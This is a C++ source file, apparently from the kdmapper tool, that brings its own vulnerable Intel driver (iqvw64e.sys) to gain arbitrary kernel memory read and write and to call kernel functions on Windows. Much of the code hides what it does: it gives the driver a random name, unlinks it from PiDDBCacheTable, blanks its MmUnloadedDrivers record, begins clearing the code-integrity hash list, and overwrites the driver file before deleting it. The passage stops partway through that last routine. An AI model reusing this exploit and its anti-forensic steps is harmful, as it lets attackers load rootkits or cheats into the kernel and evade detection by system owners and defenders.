#include "intel_driver.hpp"

ULONG64 intel_driver::ntoskrnlAddr = 0;
char intel_driver::driver_name[100] = {};
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

std::wstring intel_driver::GetDriverNameW() {
	std::string t(intel_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring intel_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

HANDLE intel_driver::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	if (intel_driver::IsRunning()) {
		Log(L"[-] \\Device\\Nal is already in use." << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!result || result == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	return result;
}

bool intel_driver::Unload(HANDLE device_handle) {
	Log(L"[<] Unloading vulnerable driver" << std::endl);

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}

	if (!service::StopAndRemove(GetDriverNameW()))
		return false;

	std::wstring driver_path = GetDriverPath();

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = sizeof(intel_driver_resource::driver) + ((long long)rand() % 2348767 + 56725);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if (_wremove(driver_path.c_str()) != 0)
		return false;

	return true;
}

bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory) {
		Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif


	return result;
}

/*added by psec*/
uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocatePagesForMdl");

	if (!kernel_MmAllocatePagesForMdl)
	{
		Log(L"[!] Failed to find MmAlocatePagesForMdl" << std::endl);
		return 0;
	}

	uint64_t allocated_pages = 0;

	if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes))
		return 0;

	return allocated_pages;
}

uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");

	if (!kernel_MmMapLockedPagesSpecifyCache)
	{
		Log(L"[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl);
		return 0;
	}

	uint64_t starting_address = 0;

	if (!CallKernelFunction(device_handle, &starting_address, kernel_MmMapLockedPagesSpecifyCache, pmdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
		return 0;

	return starting_address;
}

bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmProtectMdlSystemAddress");

	if (!kernel_MmProtectMdlSystemAddress)
	{
		Log(L"[!] Failed to find MmProtectMdlSystemAddress" << std::endl);
		return 0;
	}

	NTSTATUS status;

	if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
		return 0;

	return NT_SUCCESS(status);
}


bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmUnmapLockedPages");

	if (!kernel_MmUnmapLockedPages)
	{
		Log(L"[!] Failed to find MmUnmapLockedPages" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl);
}

bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmFreePagesFromMdl");

	if (!kernel_MmFreePagesFromMdl)
	{
		Log(L"[!] Failed to find MmFreePagesFromMdl" << std::endl);
		return 0;
	}

	void* result;
	return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}
/**/

uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'erhT'))
		return 0;

	return allocated_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		Log(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == 0)
	{
		if (buffer != 0)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == device_handle)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[!] Failed to find device_object" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[!] Failed to find driver_object" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[!] Failed to find driver_section" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log(L"[!] Failed to find driver name" << std::endl);
		return false;
	}

	wchar_t* unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL];
	memset(unloadedName, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));

	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length)) {
		Log(L"[!] Failed to read driver name" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	Log(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);

	delete[] unloadedName;

	return true;
}

PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		Log(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		Log(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}


intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
	
	PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
}

bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver

	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", (char*)"xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", (char*)"xxxxxx"); // 66 03 D2 48 8D 0D

	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", (char*)"xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if (PiDDBLockPtr == NULL) {
			Log(L"[-] Warning PiDDBLock not found" << std::endl);
			return false;
		}
		Log(L"[+] PiDDBLock found with second pattern" << std::endl);
		PiDDBLockPtr += 16; //second pattern offset
	}
	else {
		PiDDBLockPtr += 28; //first pattern offset
	}

	if (PiDDBCacheTablePtr == NULL) {
		Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	Log("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);

	//context part is not used by lookup, lock or delete why we should use it?

	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	Log(L"[+] PiDDBLock Locked" << std::endl);

	auto n = GetDriverNameW();

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

	if (!WriteMemory(device_handle, (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	if (!WriteMemory(device_handle, (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		Log(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	//Decrement delete count
	ULONG cacheDeleteCount = 0;
	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	// release the ddb resource lock
	ExReleaseResourceLite(device_handle, PiDDBLock);

	Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);

	return true;
}

uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
	if (!dwAddress) {
		Log(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		Log(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	BYTE* sectionData = new BYTE[dwLen];
	if (!ReadMemory(device_handle, dwAddress, sectionData, dwLen)) {
		Log(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = utils::FindPattern((uintptr_t)sectionData, dwLen, bMask, szMask);

	if (result <= 0) {
		Log(L"[-] Can't find pattern" << std::endl);
		delete[] sectionData;
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData + result;
	delete[] sectionData;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
		Log(L"[-] Can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		Log(L"[-] Can't find section" << std::endl);
		return 0;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, BYTE* bMask, char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		Log(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), (char*)"xxx????x?xxxxxxx");
	if (!sig) {
		Log(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), (char*)"xxx");
	if (!sig2) {
		Log(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		Log(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}

	Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[+] g_HashCacheLock Locked" << std::endl);

